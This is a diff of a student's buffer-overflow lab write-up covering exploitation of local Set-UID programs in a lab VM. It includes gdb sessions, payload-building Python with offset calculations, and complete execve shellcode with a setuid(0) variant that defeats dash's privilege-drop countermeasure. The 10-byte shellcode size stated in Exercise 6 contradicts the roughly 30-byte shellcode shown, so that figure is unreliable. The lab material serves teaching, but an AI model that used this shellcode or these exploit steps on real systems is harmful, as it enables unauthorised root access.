@@ -1,4 +1,4 @@
-# Lab 7: Buffer Overflow Attack Lab (Set-UID Version)
+# Lab 7: Buffer Overflow Attack Lab (`Set-UID` Version)
 
 Objective: develop a scheme to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, students will be guided to walk through several protection schemes that have been implemented in the operating system to counter against buffer-overflow attacks. Students need to evaluate whether the schemes work or not and explain why.
 
@@ -15,7 +15,7 @@ sudo sysctl -w kernel.randomize_va_space=0
 
 ### Configuring /bin/sh
 
-In the recent versions of Ubuntu OS, the `/bin/sh` symbolic link points to the `/bin/dash` shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process. Basically, if they detect that they are executed in a Set-UID process, they will immediately change the effective user ID to the process’s real user ID, essentially dropping the privilege.
+In the recent versions of Ubuntu OS, the `/bin/sh` symbolic link points to the `/bin/dash` shell. The dash program, as well as bash, has implemented a security countermeasure that prevents itself from being executed in a `Set-UID` process. Basically, if they detect that they are executed in a `Set-UID` process, they will immediately change the effective user ID to the process’s real user ID, essentially dropping the privilege.
 
 We have installed a shell program called `zsh` in our Ubuntu 20.04 VM. The following command can be used to link `/bin/sh` to `zsh`:
 ```bash
@@ -45,7 +45,7 @@ gcc -z execstack -o a64.out call_shellcode.c
 We can see in the image that both binaries run without any problem despite working on a 64-bit VM. Modern Linux OS includes compatibility layers (such as the ia32-libs package) that allow them to run 32-bit binaries. This is accomplished through the use of system libraries that can handle the translation from 32-bit to 64-bit system calls.
 
 
-If we make `/Lab7/exercise1/a32.out` and `/Lab7/exercise1/a64.out` root-owned Set-UID programs, we can obtain a root shell.
+If we make `/Lab7/exercise1/a32.out` and `/Lab7/exercise1/a64.out` root-owned `Set-UID` programs, we can obtain a root shell.
 
 ![make](/Lab7/exercise1/img/2.png)
 
@@ -146,7 +146,7 @@ offset = 0xffffcf08 - 0xffffce9c + L # The size of the buffer in the vulnerable 
 ret = 0xffffce9c + offset + 100 
 ```
 
-Finally running `/Lab7/exercise3/stack-L1` (the set-UID program) will give us the root shell  due to copying excess data from the `badfile` which causes buffer overflow. By doing so, we can redirect the program's execution flow to a location controlled by `badfile`, 
+Finally running `/Lab7/exercise3/stack-L1` (the `Set-UID` program) will give us the root shell  due to copying excess data from the `badfile` which causes buffer overflow. By doing so, we can redirect the program's execution flow to a location controlled by `badfile`, 
 
 
 ![attacks](/Lab7/exercise3/img/2.png)
@@ -269,9 +269,9 @@ content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
 
 ![attacks](/Lab7/exercise5/img/2.png)
 
-## Exercise 6: Task 6: Launching Attack on 64-bit Program (Level 4)
+## Exercise 6: Launching Attack on 64-bit Program (Level 4)
 
-The target program (stack-L4) in this task is similar to the one in the Level 2, except that the buffer size is extremely small. We set the buffer size to 10, while in Level 2, the buffer size is much larger. Your goal is the same: get the root shell by attacking this Set-UID program. 
+The target program (`/Lab7/exercise6/stack-L4`) in this task is similar to the one in the Level 2, except that the buffer size is extremely small. We set the buffer size to 10, while in Level 2, the buffer size is much larger. Your goal is the same: get the root shell by attacking this `Set-UID` program. 
 
 
 To do the attack we use `gdb` to find the buffer and edp addres:
@@ -293,12 +293,12 @@ $2 = (char (*)[10]) 0x7fffffffd986
 ```
 ![attacks](/Lab7/exercise6/img/1.png)
 
-Due to the calculated buffer space being too small, it cannot accommodate the shellcode (which is 30 bytes in size). Therefore, the buffer in the bof function cannot be used here. Consequently, we redirect our attention to the `str` variable in the main function, which also stores the content of the shellcode. Therefore, we need to set the return address (`ret`) in the buffer to point to the shellcode within the `str` variable. It's important to note that breakpoints need to be reset because `str` is passed as a pointer to a pointer,
+Due to the calculated buffer space being too small, it cannot accommodate the shellcode (which is 10 bytes in size). Therefore, the buffer in the bof function cannot be used here. Consequently, we redirect our attention to the `str` variable in the main function, which also stores the content of the shellcode. Therefore, we need to set the return address (`ret`) in the buffer to point to the shellcode within the `str` variable. It's important to note that breakpoints need to be reset because `str` is passed as a pointer to a pointer:
 
 ```bash
 [04/06/24]seed@VM:~/.../ex6$ gdb stack-L4-dbg 
 gdb-peda$ b main
-Breakpoint 1 at 0x11a9: file stack.c, line 14.
+Breakpoint 1 at 0x11a9: file stack.c, line 26.
 gdb-peda$ run
 ...
 Breakpoint 1, main (argc=0x0, argv=0x0) at stack.c:26
@@ -325,7 +325,7 @@ shellcode= (
 ).encode('latin-1')
 
 # Put the shellcode somewhere in the payload
-start = 517 - len(shellcode)                 # 
+start = 517 - len(shellcode)                  
 content[start:start + len(shellcode)] = shellcode
 
 # Decide the return address value and put it somewhere in the payload
@@ -337,8 +337,56 @@ offset = rbp - buffer + 8
 
 # In this example, we're assuming a 64-bit architecture.
 L = 8  
-s 
+
 content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
 ```
 
 ![attacks](/Lab7/exercise6/img/3.png)
+
+
+## Exercise 7: Defeating dash’s Countermeasure
+
+To defeat the countermeasure in buffer-overflow attacks, all we need to do is to change the real UID, so it equals the effective UID. When a root-owned `Set-UID` program runs, the effective UID is zero, so before we invoke the shell program, we just need to change the real UID to zero. We can achieve this by invoking setuid(0) before executing `execve()` in the shellcode
+
+First we compile `/Lab7/exercise7/call_shellcode.c` as `Set-UID` program without anu modification:
+
+```c
+const char shellcode[] =
+#if __x86_64__
+  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+#else
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+#endif
+;
+```
+And run a64.out and a32.out:
+![attacks](/Lab7/exercise7/img/1.png)
+
+As we can see, we are gettin a normal bash, not a root bash.
+
+Now we change `/Lab7/exercise7/call_shellcode.c` to:
+```c
+const char shellcode[] =
+#if __x86_64__
+  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
+  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
+  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
+  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+#else
+  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+#endif
+;
+```
+And run a64.out and a32.out again:
+![attacks](/Lab7/exercise7/img/2.png)
+
+After running the modified set-UID program with the updated shellcode, we successfully obtains a root shell, as indicated by the command prompt change from `$` to `#.`
+
+To escalate privileges, the shellcode is modified to include additional instructions that escalate the process's privileges `before` spawning the shell.
